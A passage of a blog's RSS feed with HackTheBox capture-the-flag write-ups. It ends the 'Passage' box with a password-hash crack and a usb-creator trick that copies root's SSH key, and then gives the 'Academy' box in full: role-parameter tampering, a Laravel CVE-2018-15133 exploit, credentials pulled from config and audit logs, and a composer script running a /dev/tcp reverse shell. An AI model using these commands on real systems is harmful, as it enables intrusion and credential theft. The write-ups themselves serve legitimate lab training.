&lt;pre&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:10:&amp;quot;paul-coles&amp;quot;;a:9:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483236&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;paul-coles&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:16:&amp;quot;paul@passage.htb&amp;quot;;s:4:&amp;quot;nick&amp;quot;;s:10:&amp;quot;Paul Coles&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592485556&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like we got nadav and paul&amp;rsquo;s hash password&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s a sha2-256 hash, we&amp;rsquo;re gonna use Hashcat with the rockyou wordlist to crack them!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&amp;quot; &amp;gt; hash 
echo &amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot; &amp;gt; hash
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;hashcat -m 1400 hash /opt/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like we were only able to crack paul&amp;rsquo;s hash!&lt;/p&gt;
&lt;img src=&#34;cracked.png&#34;&gt;
&lt;p&gt;&lt;code&gt;paul:atlanta1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And grab our user flag&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreennadav-user-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nadav user &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;We can notice that nadav can access paul&amp;rsquo;s session&lt;/p&gt;
&lt;img src=&#34;ssh.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s see if paul&amp;rsquo;s can access nadav&amp;rsquo;s session&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh nadav@passage
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nadav.png&#34;&gt;
&lt;p&gt;It worked!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s first run&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ps -aux
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To see the current running processes!
&lt;img src=&#34;usb.png&#34;&gt;
What really catches me is that root is running, and that&amp;rsquo;s odd&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A bit a searching/reading from google can lead us to something, which is the ability to get any file we want!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;root1.png&#34;&gt;
&lt;p&gt;And we rooted the box!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Academy Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-academy/</link>
      <pubDate>Sat, 27 Feb 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-academy/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nmap.png&#34;&gt;
As we see we have 2 ports open &lt;br/&gt;
SSH on port 22 running OpenSSH 8.2p1 &lt;br/&gt;
http on port 80 running httpd 2.4.41 &lt;br/&gt;
&lt;p&gt;we notice as well the academy.htb domain, which we should add to /etc/hosts.&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreengobuster-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Gobuster scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;gob.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-footholdp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold&lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenidentifying-the-exploitp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Identifying the exploit&lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;So basically the first thing that tried was sql injection on &lt;b&gt; admin.php &lt;/b&gt; but that didn&amp;rsquo;t give me any results. as we don&amp;rsquo;t have any potential users let&amp;rsquo;s move on and dig further. &lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s create an account and see if we can find any usernames and intercept it with burp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o
Connection: close
uid=elleuch&amp;amp;password=elleuch&amp;amp;confirm=elleuch&amp;amp;roleid=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can notice the &lt;b&gt;roleid&lt;/b&gt;	parameter which is set to 0. we can assume that&amp;rsquo;s assigning a role to the user we&amp;rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to &lt;b&gt;/admin.php&lt;/b&gt;&lt;/p&gt;
&lt;img src=&#34;planner.png&#34;&gt;
&lt;p&gt;As we see above the planner leaks to us a subdomain &lt;b&gt;dev-staging-01.academy.htb&lt;/b&gt; &lt;br/&gt;
Let&amp;rsquo;s add it to /etc/hosts and see what we get&lt;/p&gt;
&lt;img src=&#34;laravel.png&#34;&gt;
&lt;p&gt;Errors! That sounds promosing! Scrolling down we can see something really interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;APP_KEY	 &amp;quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have the APP_KEY! We can abuse &lt;b&gt;Laravel Unserialize Vulnerability CVE-2018-15133 &lt;/b&gt; &lt;br/&gt;
For this exploit we&amp;rsquo;ll be using this script, a pretty easy syntax.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And voilÃ  we&amp;rsquo;re on the box&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Now let&amp;rsquo;s start enumarating,We already know that the webserver is running PHP Laravel. &lt;/br&gt;
The first thing we should look at is the &lt;b&gt;.env&lt;/b&gt; file. &lt;/br&gt;
&lt;img src=&#34;env.png&#34;&gt;
And we get a password! &lt;br /&gt;
&lt;code&gt;mySup3rP4s5w0rd!!&lt;/code&gt; &lt;br/&gt;
Let&amp;rsquo;s see if it belongs to any existing user
&lt;img src=&#34;users.png&#34;&gt;
After manually trying to switch to these users, it turns out to be cry0l1t3&amp;rsquo;s password
&lt;img src=&#34;logincry.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our user is in the &lt;b&gt;adm&lt;/b&gt; group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it&lt;/p&gt;
&lt;img src=&#34;mrb3.png&#34;&gt;
&lt;p&gt;&lt;code&gt;data=6D7262336E5F41634064336D79210A&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Seems we got a password! But it&amp;rsquo;s hex encoded! Let&amp;rsquo;s decode it&lt;/p&gt;
&lt;img src=&#34;pw.png&#34;&gt;
&lt;p&gt;&lt;code&gt;mrb3n_Ac@d3my!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Seems like it&amp;rsquo;s mrb3n&amp;rsquo;s password!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Mrb3n can execute &lt;b&gt;/usr/bin/composer&lt;/b&gt; as root!&lt;/p&gt;
&lt;img src=&#34;sudo.png&#34;&gt;
&lt;p&gt;Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{ 
&amp;quot;scripts&amp;quot;:{&amp;quot;shell&amp;quot;:&amp;quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.111/4444 0&amp;gt;&amp;amp;1&#39;&amp;quot;}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We set our listener&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvnp 4444 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And execute&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo /usr/bin/composer --working-dir=fake run-script shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;root.png&#34; &gt;&lt;/p&gt;
&lt;p&gt;And we rooted the box! &lt;br/&gt;
&lt;code&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
  </channel>
</rss>
